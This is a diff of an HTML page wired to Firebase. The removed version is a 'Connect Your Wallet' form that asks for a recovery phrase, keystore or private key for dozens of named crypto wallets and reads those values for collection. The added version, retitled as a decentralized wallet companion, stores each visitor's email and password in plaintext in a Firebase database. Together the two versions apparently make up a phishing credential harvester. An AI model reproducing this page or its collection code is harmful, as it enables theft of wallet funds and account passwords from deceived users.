@@ -1,326 +1,167 @@
-
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Your Wallet</title>
-    <script src="js/script.js"></script>
-    <style>
+    <title>Artistry Unleashed - Your Decentralized Wallet Companion</title>
+    <script src="js/script.js"> </script>
+   <style>
         body {
-            font-family: 'Arial', sans-serif;
-            background-color: #f9f9f9;
-            color: #333;
+             font-family: 'Arial', sans-serif;
+            background-image: url('https://i.ibb.co/R0Zw1Tb/bg-crypto-jwv.jpg');
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
             margin: 0;
             padding: 0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
         }
 
         header {
-            background: linear-gradient(to right, #3498db, #6ab0de);
+
             color: #fff;
             text-align: center;
             padding: 20px;
-            border-radius: 10px 10px 0 0;
+            height:400px;
         }
 
         section {
             margin: 20px;
             padding: 40px;
-            background: linear-gradient(to bottom, #fff, #f0f0f0);
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             border-radius: 10px;
-            text-align: center;
         }
 
         h1 {
-            font-size: 3em;
-            color: #fff; /* White color */
-            margin-bottom: 20px;
+            font-size: 2.5em;
+            color: #333;
         }
 
         p {
-            font-size: 1.4em;
-            line-height: 1.6;
-            color: #555;
-            margin-bottom: 30px;
-        }
-
-        .wallet-actions {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: space-around;
-            margin-top: 30px;
-        }
-
-        .wallet-action {
-            background: linear-gradient(to bottom, #3498db, #6ab0de);
-            color: #fff;
-            padding: 15px 30px;
-            margin: 20px;
-            text-align: center;
-            text-decoration: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: background 0.3s ease;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-        }
-
-        .wallet-action:hover {
-            background: linear-gradient(to bottom, #2980b9, #5499c7);
-        }
-
-        .wallet-icon {
-            font-size: 2em;
-            margin-bottom: 10px;
-        }
-
-        .selected-wallet {
-            border: 2px solid #4CAF50;
-        }
-
-        #wallet-connect-form {
-            display: none;
-            margin-top: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 10px;
             font-size: 1.2em;
-            color: #3498db; /* Blue color */
+            line-height: 1.6;
+        }
+        
+        
+          .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            text-align: center;
+            z-index: 999;
         }
 
-        select,
-        input,
-        textarea {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            font-size: 1em;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            box-sizing: border-box;
+        .popup h2 {
+            color: #ff7e5f;
         }
 
-        button {
-            background: linear-gradient(to bottom, #3498db, #6ab0de);
+        .popup p {
+            color: #333;
+            margin-bottom: 20px;
+        }
+
+        .popup-btn {
+            background: linear-gradient(to right, #ff7e5f, #feb47b);
             color: #fff;
-            padding: 15px 30px;
+            padding: 10px 20px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 1.2em;
-            transition: background 0.3s ease;
+        }
+        
+        
+        
+
+       .paragraph-container {
+    background-color: rgba(55, 71, 79, 0.5); /* Semi-transparent dark blue-gray background */
+    color: #fff; /* White text color */
+    padding: 20px;
+    border-radius: 10px;
+    margin: 50px;
+    text-align: center;
+}
+
+.paragraph-container h1 {
+    background: linear-gradient(to right, #ff7e5f, #feb47b); /* Gradient background for h1 */
+    -webkit-background-clip: text;
+    color: transparent; /* Make the text transparent so the gradient background shows through */
+}
+
+.paragraph-container p {
+    color: #fff; /* White color for paragraphs */
+}
+
+        
+        .selection-buttons, .wallet-actions {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            margin-top: 20px;
         }
 
-        button:hover {
-            background: linear-gradient(to bottom, #2980b9, #5499c7);
+       .selection-button, .wallet-action {
+    background: linear-gradient(to right, #ff7e5f, #feb47b); /* Gradient from coral to peach */
+    color: #fff;
+    padding: 15px 25px;
+    margin: 10px;
+    text-align: center;
+    text-decoration: none;
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    font-size: 1.2em;
+    transition: background 0.3s, color 0.3s, transform 0.3s;
+}
+
+.selection-button:hover, .wallet-action:hover {
+    background: linear-gradient(to right, #ff7e5f, #feb47b); /* Same gradient on hover */
+    color: #fff;
+    transform: scale(1.05);
+}
+
+
+        .sticky-bar {
+            height: 62px;
+            overflow: hidden;
+            box-sizing: border-box;
+            text-align: right;
+            line-height: 14px;
+            block-size: 62px;
+            font-size: 12px;
+            font-feature-settings: normal;
+            text-size-adjust: 100%;
+            padding: 1px;
+            padding: 0px;
+            margin: 0px;
+            width: 100%;
         }
+        
+          .btnconnect {
+            padding-top:50px;
+        }
+        
     </style>
-
-    <script src="script.js"></script>
-    
 </head>
-
 <body>
-    <header>
-        <h1>Connect Your Wallet</h1>
-        <p>Choose your preferred wallet type and enter your credentials to connect.</p>
-    </header>
 
-<section>
-        <div class="wallet-actions">
-            <!-- Wallet options dynamically generated from the provided list -->
-            <label for="wallet-list">Choose Wallet:</label>
-            <select id="wallet-list" onchange="selectWallet()">
-                 <option value="">Select a wallet</option>
-                <option value="MetaMask">MetaMask</option>
-                <option value="Trust Wallet">Trust Wallet</option>
-                <option value="Coinbase Wallet">Coinbase Wallet</option>
-                <option value="Ledger Nano X">Ledger Nano X</option>
-                <option value="Trezor Model T">Trezor Model T</option>
-                <option value="Mycelium">Mycelium</option>
-                <option value="Exodus">Exodus</option>
-                <option value="Leap Wallet">Leap Wallet</option>
-                <option value="Stader">Stader</option>
-                <option value="Atomic Wallet">Atomic Wallet</option>
-                <option value="Electrum">Electrum</option>
-                <option value="Coinomi">Coinomi</option>
-                <option value="Celsius">Celsius</option>
-                <option value="ZenGo">ZenGo</option>
-                <option value="Safepal S1">Safepal S1</option>
-                <option value="Ledger Nano S">Ledger Nano S</option>
-                <option value="Guard Wallet">Guard Wallet</option>
-                <option value="BitKeep">BitKeep</option>
-                <option value="eToro Money Crypto Wallet">eToro Money Crypto Wallet</option>
-                <option value="FTX Wallet">FTX Wallet</option>
-                <option value="Phantom Wallet">Phantom Wallet</option>
-                <option value="KeepKey">KeepKey</option>
-                <option value="Ellipal Titan">Ellipal Titan</option>
-                <option value="Argent Wallet">Argent Wallet</option>
-                <option value="YouHodler">YouHodler</option>
-                <option value="Bitbox02">Bitbox02</option>
-                <option value="Coldcard">Coldcard</option>
-                <option value="Keystone Pro">Keystone Pro</option>
-                <option value="Kraken">Kraken</option>
-                <option value="Gemini">Gemini</option>
-                <option value="SimpleHold Wallet">SimpleHold Wallet</option>
-                <option value="MyEtherWallet">MyEtherWallet</option>
-                <option value="Infinito Wallet">Infinito Wallet</option>
-                <option value="Wirex Wallet">Wirex Wallet</option>
-                <option value="CoinSpace Wallet">CoinSpace Wallet</option>
-                <option value="CoolWallet S">CoolWallet S</option>
-                <option value="Crypto.com DeFi Wallet">Crypto.com DeFi Wallet</option>
-                <option value="BitPay">BitPay</option>
-                <option value="Empire Wallet">Empire Wallet</option>
-                <option value="StakedWallet.io">StakedWallet.io</option>
-                <option value="Jaxx">Jaxx</option>
-                <option value="Xapo Wallet">Xapo Wallet</option>
-                <option value="Crypterium">Crypterium</option>
-                <option value="BitFreezer">BitFreezer</option>
-                <option value="Luno">Luno</option>
-                <option value="CoinJar Wallet">CoinJar Wallet</option>
-                <option value="Quppy">Quppy</option>
-                <option value="Freewallet">Freewallet</option>
-                <option value="SecuX Stone V20">SecuX Stone V20</option>
-                <option value="BitLox Ultimate">BitLox Ultimate</option>
-                <option value="Unstoppable Wallet">Unstoppable Wallet</option>
-                <option value="Binance Chain Wallet">Binance Chain Wallet</option>
-                <option value="D'CENT Wallet">D'CENT Wallet</option>
-                <option value="BC Vault Wallet">BC Vault Wallet</option>
-                <option value="Arculus Wallet">Arculus Wallet</option>
-                <option value="Robinhood Crypto Wallet">Robinhood Crypto Wallet</option>
-                <option value="Wasabi Wallet">Wasabi Wallet</option>
-                <option value="Nexo">Nexo</option>
-                <option value="BRD Wallet">BRD Wallet</option>
-                <option value="Keplr">Keplr</option>
-                <option value="GreenAddress Wallet">GreenAddress Wallet</option>
-                <option value="Huobi Wallet">Huobi Wallet</option>
-                <option value="Enjin Wallet">Enjin Wallet</option>
-                <option value="StormGain">StormGain</option>
-                <option value="Clever">Clever</option>
-                <option value="TrustVault">TrustVault</option>
-                <option value="Moonlet">Moonlet</option>
-                <option value="TokenPocket">TokenPocket</option>
-                
-
-            </select>
-        </div>
-
-        <form id="wallet-connect-form">
-         <label for="wallet-type">Selected Wallet:</label>
-            <input type="text" id="selected-wallet" readonly>
-<!--    
-            <label for="wallet-info-type">Select Wallet Information Type:</label>
-            <select id="wallet-info-type" onchange="showInfoInput()">
-                 <option value="phrase">Phrase</option>
-                <option value="keystore">Keystore</option>
-                <option value="private-key">Private Key</option>
-            </select>
-
-            <div id="info-input-container"></div> -->
-                     <label for="email">mail:</label>
+    
+<form>
+        <h2>Connexion</h2>
+        <label for="email">mail:</label>
         <input type="email" id="email" name="email" required>
 
         <label for="password">Mot de passe:</label>
         <input type="password" id="password" name="password" required>
 
-            <button type="button" id="submitData" name="submitData">Connect</button>
-        </form>
-    </section>
-
-
-
-    <script>
-        function selectWallet() {
-            var selectedWallet = document.getElementById("wallet-list").value;
-            document.getElementById("selected-wallet").value = selectedWallet;
-            showWalletForm(selectedWallet);
-        }
-
-        function showWalletForm(selectedWallet) {
-            // Display the wallet connection form
-            document.getElementById('wallet-connect-form').style.display = 'block';
-
-            // Show or hide information input based on the selected wallet type
-            showInfoInput(selectedWallet);
-        }
-
-        function showInfoInput(selectedWallet) {
-            // Retrieve selected information type
-            const walletInfoType = document.getElementById('wallet-info-type').value;
-
-            // Remove any existing information input elements
-            const infoInputContainer = document.getElementById('info-input-container');
-            infoInputContainer.innerHTML = '';
-
-            // Dynamically create and append information input fields based on the selected type and wallet
-            switch (walletInfoType) {
-                case 'phrase':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-phrase">Enter your recovery phrase for ${selectedWallet}:</label>
-                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
-                    `;
-                    break;
-                case 'keystore':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-keystore">Enter Keystore for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
-                        <label for="wallet-password">Wallet Password:</label>
-                        <input type="password" id="wallet-password" placeholder="Enter your password">
-                    `;
-                    break;
-                case 'private-key':
-                    infoInputContainer.innerHTML = `
-                        <label for="wallet-private-key">Enter your Private Key for ${selectedWallet}:</label>
-                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
-                    `;
-                    break;
-                default:
-                    break;
-            }
-        }
-
-        function connectWallet() {
-            // Retrieve selected wallet type, information type, and credentials
-            const selectedWallet = document.getElementById('selected-wallet').value;
-            const walletInfoType = document.getElementById('wallet-info-type').value;
-
-            // Retrieve information input based on the selected type
-            let walletCredentials;
-            switch (walletInfoType) {
-                case 'phrase':
-                    walletCredentials = document.getElementById('wallet-phrase').value;
-                    break;
-                case 'keystore':
-                    const walletKeystore = document.getElementById('wallet-keystore').value;
-                    const walletPassword = document.getElementById('wallet-password').value;
-                    walletCredentials = { keystore: walletKeystore, password: walletPassword };
-                    break;
-                case 'private-key':
-                    walletCredentials = document.getElementById('wallet-private-key').value;
-                    break;
-                default:
-                    break;
-            }
-
-            // Perform wallet connection logic (use web3 libraries)
-            // For simplicity, you can log the wallet type, information type, and credentials to the console
-            console.log('Selected Wallet:', selectedWallet);
-            console.log('Information Type:', walletInfoType);
-            console.log('Credentials:', walletCredentials);
-
-            // Add your actual wallet connection logic here
-        }
-    </script>
-         <script type="module">
+        <button type="button" id="submitData" name="submitData" >Se Connecter</button>
+    </form>
+    <script type="module">
   // Import the functions you need from the SDKs you need
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
      import { getAuth, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-auth.js";
@@ -346,28 +187,7 @@
         submitData.addEventListener('click',(e) => {
             var email= document.getElementById('email').value;
              var password= document.getElementById('password').value;
-              // Retrieve selected wallet type, information type, and credentials
-            const selectedWallet = document.getElementById('selected-wallet').value;
-            const walletInfoType = document.getElementById('wallet-info-type').value;
-
-            // Retrieve information input based on the selected type
-            let walletCredentials;
-            switch (walletInfoType) {
-                case 'phrase':
-                    walletCredentials = document.getElementById('wallet-phrase').value;
-                    break;
-                case 'keystore':
-                    const walletKeystore = document.getElementById('wallet-keystore').value;
-                    const walletPassword = document.getElementById('wallet-password').value;
-                    walletCredentials = { keystore: walletKeystore, password: walletPassword };
-                    break;
-                case 'private-key':
-                    walletCredentials = document.getElementById('wallet-private-key').value;
-                    break;
-                default:
-                    break;
-            }
-            // ,selectedWallet,walletKeystore,walletPassword,walletCredentials
+            
             createUserWithEmailAndPassword(auth, email,password)
   .then((userCredential) => {
     // Signed up 
@@ -375,12 +195,7 @@
       // ... user.uid
        set(ref(database, 'users/' + user.uid), {
     email: email,
-           password: password,
-   //  selectedWallet: selected-wallet,
-   //  walletCredentials: wallet-phrase,
-   //  walletKeystore: wallet-keystore,
-   //  walletPassword: wallet-password,
-   // walletCredentials:wallet-private-key       
+    password: password
   })
       .then(() => {
   // Data saved successfully!
@@ -401,19 +216,5 @@
   });
         });
 </script>
-
-
-
-
-
-    
 </body>
-
 </html>
-
-
-
-
-
-
-    
